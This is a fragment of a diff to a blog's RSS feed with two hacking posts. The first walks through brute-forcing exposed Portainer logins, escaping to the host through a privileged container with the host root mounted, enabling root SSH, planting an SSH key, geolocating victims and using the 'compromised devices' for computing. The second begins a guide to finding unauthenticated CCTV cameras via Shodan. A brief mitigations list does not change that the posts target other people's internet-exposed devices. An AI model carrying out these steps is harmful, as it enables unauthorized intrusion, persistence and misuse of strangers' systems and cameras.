+    &gt;Gill-Singh-A&lt;/a&gt;, it is a Program written in Python that uses requests to brute force the Web Interface of Portainer through &lt;em&gt;/api/auth&lt;/em&gt; endpoint and multithreading module to parallelize the brute force tasks.&lt;br &gt;
+I&amp;rsquo;ve attached a small example of brute force in the following picture.&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/brute_force.png&#34;
+	width=&#34;1214&#34;
+	height=&#34;788&#34;
+	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/brute_force_hu9138035496253350322.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/brute_force_hu14537001647000182556.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Brute Force&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;154&#34;
+		data-flex-basis=&#34;369px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;getting-remote-root-shell&#34;&gt;Getting Remote Root Shell
+&lt;/h2&gt;&lt;p&gt;Now after getting access to the Portainer Web Interface, our job is to get a Remote Root Shell.&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/portainer_interface.png&#34;
+	width=&#34;1920&#34;
+	height=&#34;1080&#34;
+	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/portainer_interface_hu9614265903048951971.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/portainer_interface_hu8576249461380108094.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Portainer Interface&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;177&#34;
+		data-flex-basis=&#34;426px&#34;
+	
+&gt;&lt;br /&gt;
+First, we have to go to Images and find any Linux OS Image. Here in this example we see &lt;em&gt;ubuntu:latest&lt;/em&gt;&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/portainer_images.png&#34;
+	width=&#34;1920&#34;
+	height=&#34;1080&#34;
+	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/portainer_images_hu2322801518449959949.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/portainer_images_hu18078554214050661318.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Portainer Images&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;177&#34;
+		data-flex-basis=&#34;426px&#34;
+	
+&gt;&lt;br /&gt;
+Next, we go to containers and click on &lt;strong&gt;Add Container&lt;/strong&gt;&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/add_container.png&#34;
+	width=&#34;714&#34;
+	height=&#34;154&#34;
+	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/add_container_hu3666424460501405624.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/add_container_hu15059500577359673673.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Add Container&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;463&#34;
+		data-flex-basis=&#34;1112px&#34;
+	
+&gt;&lt;br /&gt;
+We name the Container as &lt;em&gt;health_test&lt;/em&gt; :) and pull the Linux OS Image, in this case &lt;em&gt;ubuntu:latest&lt;/em&gt;&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_name_and_image.png&#34;
+	width=&#34;1920&#34;
+	height=&#34;1080&#34;
+	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_name_and_image_hu908856593392907783.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_name_and_image_hu12783991672513390335.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Container Name and Image&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;177&#34;
+		data-flex-basis=&#34;426px&#34;
+	
+&gt;&lt;br /&gt;
+In the command and Logging Section, we select &lt;em&gt;Interactive and TTY&lt;/em&gt; Console.&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/tty_shell.png&#34;
+	width=&#34;1920&#34;
+	height=&#34;1080&#34;
+	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/tty_shell_hu15233796208589774411.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/tty_shell_hu4016618940591782649.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Interactive and TTY Console&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;177&#34;
+		data-flex-basis=&#34;426px&#34;
+	
+&gt;&lt;br /&gt;
+Next we go to &lt;em&gt;Volume&lt;/em&gt;, Click on &lt;em&gt;Map Additional Volume&lt;/em&gt;, Click on &lt;em&gt;Bind&lt;/em&gt; and select &lt;em&gt;/host&lt;/em&gt; in container and &lt;em&gt;/&lt;/em&gt; in host. This way we&amp;rsquo;ve mounted the Host Root Directory into the Docker Container and we&amp;rsquo;ll use this to get the Remote Root Shell in the upcoming setups&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/volume_bind.png&#34;
+	width=&#34;1920&#34;
+	height=&#34;1080&#34;
+	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/volume_bind_hu14721800550594329791.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/volume_bind_hu12121615468244265343.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Volume Bind&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;177&#34;
+		data-flex-basis=&#34;426px&#34;
+	
+&gt;&lt;br /&gt;
+Next in &lt;em&gt;Runtime &amp;amp; Resources&lt;/em&gt; turn &lt;em&gt;Privilege Mode&lt;/em&gt; on.&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/privilege_mode.png&#34;
+	width=&#34;1920&#34;
+	height=&#34;1080&#34;
+	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/privilege_mode_hu9582574800918379062.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/privilege_mode_hu17013298951981916531.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Privilege Mode&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;177&#34;
+		data-flex-basis=&#34;426px&#34;
+	
+&gt;&lt;br /&gt;
+Next in &lt;em&gt;Capabilities&lt;/em&gt;, turn every Linux Capability on to ensure smooth operation.&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/linux_capabilities.png&#34;
+	width=&#34;1920&#34;
+	height=&#34;1080&#34;
+	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/linux_capabilities_hu15087138263603342898.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/linux_capabilities_hu6321382386868751134.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Linux Capabilities&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;177&#34;
+		data-flex-basis=&#34;426px&#34;
+	
+&gt;&lt;br /&gt;
+Then Click on &lt;em&gt;Deploy The Container&lt;/em&gt;.&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_deploy.png&#34;
+	width=&#34;1920&#34;
+	height=&#34;1080&#34;
+	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_deploy_hu14319672496457784038.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_deploy_hu1116306713389433321.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Deploy The Container&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;177&#34;
+		data-flex-basis=&#34;426px&#34;
+	
+&gt;&lt;br /&gt;
+We can see our Container &lt;em&gt;health_test&lt;/em&gt; running.&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_running.png&#34;
+	width=&#34;1920&#34;
+	height=&#34;1080&#34;
+	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_running_hu18313534528892442679.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_running_hu17285871667837831672.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Container Running&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;177&#34;
+		data-flex-basis=&#34;426px&#34;
+	
+&gt;&lt;br /&gt;
+Then we click on &lt;em&gt;exec console&lt;/em&gt; and in the &lt;em&gt;Container Console&lt;/em&gt; connect to &lt;em&gt;/bin/bash&lt;/em&gt; as &lt;em&gt;root&lt;/em&gt; user.&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_root_user_connect.png&#34;
+	width=&#34;1920&#34;
+	height=&#34;1080&#34;
+	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_root_user_connect_hu3161454972954789171.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_root_user_connect_hu1411818477929618143.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Container Root User Bash&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;177&#34;
+		data-flex-basis=&#34;426px&#34;
+	
+&gt;&lt;br /&gt;
+Here, we&amp;rsquo;ve run the &lt;em&gt;bash&lt;/em&gt; as &lt;em&gt;root&lt;/em&gt; user in the Container&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_bash_shell.png&#34;
+	width=&#34;1920&#34;
+	height=&#34;1080&#34;
+	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_bash_shell_hu7415295291949231712.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_bash_shell_hu1747088773533602066.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Container Bash Shell&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;177&#34;
+		data-flex-basis=&#34;426px&#34;
+	
+&gt;&lt;br /&gt;
+We type the command &lt;em&gt;ps aux&lt;/em&gt; and see &lt;em&gt;bash&lt;/em&gt; Process with PID 1, this tells us that currently we&amp;rsquo;re inside the Container.&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_bash_shell_pid.png&#34;
+	width=&#34;1819&#34;
+	height=&#34;245&#34;
+	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_bash_shell_pid_hu14170412485534328633.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_bash_shell_pid_hu7937223515794384908.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Container Bash Shell PID&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;742&#34;
+		data-flex-basis=&#34;1781px&#34;
+	
+&gt;&lt;br /&gt;
+Then to break out of the Container, we change our directory to &lt;em&gt;/host&lt;/em&gt; and &lt;em&gt;chroot&lt;/em&gt; into it and to confirm that We&amp;rsquo;ve successfully broken out of the container, we type &lt;em&gt;ps aux&lt;/em&gt; and see that &lt;em&gt;systemd&lt;/em&gt; has PID 1. Which confirms that we&amp;rsquo;ve broken out of the Container into the Host Machine&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_break.png&#34;
+	width=&#34;1196&#34;
+	height=&#34;282&#34;
+	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_break_hu15875942141868754971.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/container_break_hu16203558250265293144.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Container Break&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;424&#34;
+		data-flex-basis=&#34;1017px&#34;
+	
+&gt;&lt;br /&gt;
+The &lt;em&gt;chroot&lt;/em&gt; command usage is to change root directory to the supplied directory for the current running process and its children, so when we ran chroot in the &lt;em&gt;/host&lt;/em&gt; directory where the Host was mounted, then it changed the root directory to host and hence broke out of the docker container.&lt;br /&gt;
+Next we check that we can login as root via ssh using the following command&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat /etc/ssh/sshd_config &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep Root
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;If not then we set it to yes.&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/ssh_root_login.png&#34;
+	width=&#34;470&#34;
+	height=&#34;70&#34;
+	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/ssh_root_login_hu12176505217845881688.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/ssh_root_login_hu14977004533623781768.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;SSH Root Login&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;671&#34;
+		data-flex-basis=&#34;1611px&#34;
+	
+&gt;&lt;br /&gt;
+Next we generate a Public-Private Key Pair with the following command on our machine&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ssh-keygen -t rsa -b &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; -C root
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Then paste the Public Key File to the &lt;em&gt;/root/.ssh/authorized_keys&lt;/em&gt; of the Target Machine.&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/ssh_keys.png&#34;
+	width=&#34;504&#34;
+	height=&#34;128&#34;
+	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/ssh_keys_hu14001699606681207158.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/ssh_keys_hu14605633080691089983.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;SSH Keys&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;393&#34;
+		data-flex-basis=&#34;945px&#34;
+	
+&gt;&lt;br /&gt;
+After all this, now we&amp;rsquo;ll be able to ssh to the Target Machine with root user.&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/ssh_root.png&#34;
+	width=&#34;688&#34;
+	height=&#34;225&#34;
+	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/ssh_root_hu7218786597690895416.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/ssh_root_hu18022615190246826073.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;SSH Root&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;305&#34;
+		data-flex-basis=&#34;733px&#34;
+	
+&gt;&lt;br /&gt;
+We can further more Geolocate the IP Addresses using &lt;a class=&#34;link&#34; href=&#34;https://github.com/Gill-Singh-A/IP-Location&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Gill-Singh-A/IP-Location&lt;/a&gt; to get an approximate location of the Devices (although it may not always be correct)&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/ip_geolocation.png&#34;
+	width=&#34;1832&#34;
+	height=&#34;900&#34;
+	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/ip_geolocation_hu14051010684105683587.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/ip_geolocation_hu9533190491809791552.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;IP Geolocation&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;203&#34;
+		data-flex-basis=&#34;488px&#34;
+	
+&gt;&lt;br /&gt;
+We can use the Compromised Devices for Cluster Computing after gaining basic information about their Processing Power, Memory, Space, etc&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/collection.png&#34;
+	width=&#34;1618&#34;
+	height=&#34;179&#34;
+	srcset=&#34;http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/collection_hu16114222399472748084.png 480w, http://localhost:1313/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/collection_hu16740672284121985108.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;DB&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;903&#34;
+		data-flex-basis=&#34;2169px&#34;
+	
+&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;mitigations&#34;&gt;Mitigations
+&lt;/h2&gt;&lt;p&gt;In this blog we saw that how easy it was to gain remote root access to a Device that was using misconfigured Portainer Web Interface (exposed to internet, using weak credentials) in several ways.&lt;br /&gt;
+To avoid getting your Device compromised, you should take the following steps:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Make sure that Portainer Interface is not exposed to the Internet&lt;/li&gt;
+&lt;li&gt;Not using Default/Weak Credentials&lt;/li&gt;
+&lt;li&gt;Setting up Proper Firewall Rules&lt;/li&gt;
+&lt;li&gt;Keeping the Software/Firmware up to date, to avoid any CVEs present in the device that could be exploited&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;note&#34;&gt;Note
+&lt;/h3&gt;&lt;p&gt;The Above mentioned points doesn&amp;rsquo;t Guarantee 100% protection, they only enhance the security&lt;/p&gt;
+&lt;h2 id=&#34;checking-leaked-passwords&#34;&gt;Checking Leaked Passwords
+&lt;/h2&gt;&lt;p&gt;There are several websites you can use to check whether the password that you&amp;rsquo;re using has been leaked somewhere online or not. Here are some popular ones:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://haveibeenpwned.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Have I Been Pwned&lt;/a&gt;: Check if your email or phone is in a data breach&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.dehashed.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Dehashed&lt;/a&gt;: Free deep-web scans and protection against credential leaks&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://leakcheck.io/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;LeakCheck.io&lt;/a&gt;: Make sure your credentials haven&amp;rsquo;t been compromised&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://crackstation.net/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;crackstation.net&lt;/a&gt;: Massive pre-computed lookup tables to crack password hashes&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://hashkiller.io/listmanager&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;HashKiller&lt;/a&gt;: Pre-cracked Hashes, easily searchable&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://leakedpassword.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;LeakedPassword&lt;/a&gt;: Search across multiple data breaches to see if your pass has been compromised&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://bugmenot.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;BugMeNot&lt;/a&gt;: Find and share logins&lt;/li&gt;
+&lt;/ul&gt;
+&lt;!-- --&gt;
+&lt;p&gt;Source: &lt;a class=&#34;link&#34; href=&#34;https://github.com/edoardottt/awesome-hacker-search-engines&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;edoardottt/awesome-hacker-search-engines&lt;/a&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Compromising Cctvs 101</title>
+        <link>http://localhost:1313/p/compromising-cctvs-101/</link>
+        <pubDate>Mon, 23 Sep 2024 05:13:06 +0530</pubDate>
+        
+        <guid>http://localhost:1313/p/compromising-cctvs-101/</guid>
+        <description>&lt;img src="http://localhost:1313/p/compromising-cctvs-101/assets/images/main_image.png" alt="Featured image of post Compromising Cctvs 101" /&gt;&lt;h1 id=&#34;compromising-cctvs-101&#34;&gt;Compromising CCTVs 101
+&lt;/h1&gt;&lt;h2 id=&#34;rtsp-protocol&#34;&gt;RTSP Protocol
+&lt;/h2&gt;&lt;p&gt;RTSP Protocol stands for &lt;em&gt;Real Time Streaming Protocol&lt;/em&gt; and by default runs on &lt;em&gt;Port 554&lt;/em&gt;. As the name tells, its an application level protocol designed to transport streams over a network and is commonly used by Devices like CCTVs. The RTSP Protocol doesn&amp;rsquo;t offer encryption, therefore everything is transparent to an Attacker eavesdropping on the Network Traffic of a Device using RTSP. We won&amp;rsquo;t cover MITM (Man-in-the-Middle) Attacks and other eavesdropping methods in this blogs, rather will focus on gaining direct access to CCTVs.&lt;/p&gt;
+&lt;h2 id=&#34;information-gathering&#34;&gt;Information Gathering
+&lt;/h2&gt;&lt;h3 id=&#34;collecting-ip-addresses-of-cctvs&#34;&gt;Collecting IP Addresses of CCTVs
+&lt;/h3&gt;&lt;p&gt;There are several ways of collecting IP Addresses of CCTVs, We&amp;rsquo;ll cover the most common ones:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Shodan&lt;/li&gt;
+&lt;li&gt;Google Dorking&lt;/li&gt;
+&lt;li&gt;Port Scanning&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;shodan&#34;&gt;Shodan
+&lt;/h4&gt;&lt;p&gt;On &lt;a class=&#34;link&#34; href=&#34;https://www.shodan.io&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Shodan Search Engine&lt;/a&gt;, search with query &lt;em&gt;port:554 RTSP&lt;/em&gt;. This would list out all the Devices that have Port 554 Open found by Shodan with &lt;em&gt;RTSP&lt;/em&gt; in their banner. Most of them will be CCTVs.
+&lt;img src=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/shodan_search.png&#34;
+	width=&#34;1920&#34;
+	height=&#34;1080&#34;
+	srcset=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/shodan_search_hu14443492354665730748.png 480w, http://localhost:1313/p/compromising-cctvs-101/assets/images/shodan_search_hu16264344125568431578.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Shodan CCTV Search&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;177&#34;
+		data-flex-basis=&#34;426px&#34;
+	
+&gt;&lt;br /&gt;
+We can even filter out more on various basis, for example location (country, city, etc)&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/shodan_report.png&#34;
+	width=&#34;1279&#34;
+	height=&#34;1021&#34;
+	srcset=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/shodan_report_hu14764165423814458476.png 480w, http://localhost:1313/p/compromising-cctvs-101/assets/images/shodan_report_hu10659267179480159027.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Shodan Report&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;125&#34;
+		data-flex-basis=&#34;300px&#34;
+	
+&gt;&lt;br /&gt;
+Or if we want to find CCTVs that have no authentication, we can provide the filter &lt;em&gt;has_screenshot:true&lt;/em&gt;.&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/shodan_search_open.png&#34;
+	width=&#34;1920&#34;
+	height=&#34;1080&#34;
+	srcset=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/shodan_search_open_hu14618864246904070306.png 480w, http://localhost:1313/p/compromising-cctvs-101/assets/images/shodan_search_open_hu2971455043730689372.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Shodan Search Open&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;177&#34;
+		data-flex-basis=&#34;426px&#34;
+	
+&gt;&lt;br/&gt;
+After setting the requeired filters, we can download the results.&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/shodan_download_results.png&#34;
+	width=&#34;715&#34;
+	height=&#34;56&#34;
+	srcset=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/shodan_download_results_hu2063741215654517212.png 480w, http://localhost:1313/p/compromising-cctvs-101/assets/images/shodan_download_results_hu6580981014759218426.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Shodan Download Results&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;1276&#34;
+		data-flex-basis=&#34;3064px&#34;
+	
+&gt;&lt;br /&gt;
+The Number of Results that can be downloaded depends upon your query credits available(1 Query Credit = 100 Results)&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/shodan_download_results_1.png&#34;
+	width=&#34;1224&#34;
+	height=&#34;496&#34;
+	srcset=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/shodan_download_results_1_hu565796369991160296.png 480w, http://localhost:1313/p/compromising-cctvs-101/assets/images/shodan_download_results_1_hu11318525179348910452.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Shodan Download Results&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;246&#34;
+		data-flex-basis=&#34;592px&#34;
+	
+&gt;&lt;br /&gt;
+After Shodan has done compiling the data, it sends us a Mail that &lt;em&gt;Data is ready for Download&lt;/em&gt; or we can alernatively wait on &lt;a class=&#34;link&#34; href=&#34;https://www.shodan.io/download&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Shodan Download Page&lt;/a&gt; while the data is being compiled&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/shodan_mail.png&#34;
+	width=&#34;827&#34;
+	height=&#34;526&#34;
+	srcset=&#34;http://localhost:1313/p/compromising-cctvs-101/assets/images/shodan_mail_hu18147256887731184041.png 480w, http://localhost:1313/p/compromising-cctvs-101/assets/images/shodan_mail_hu13989390231115179836.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Shodan Download Mail&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
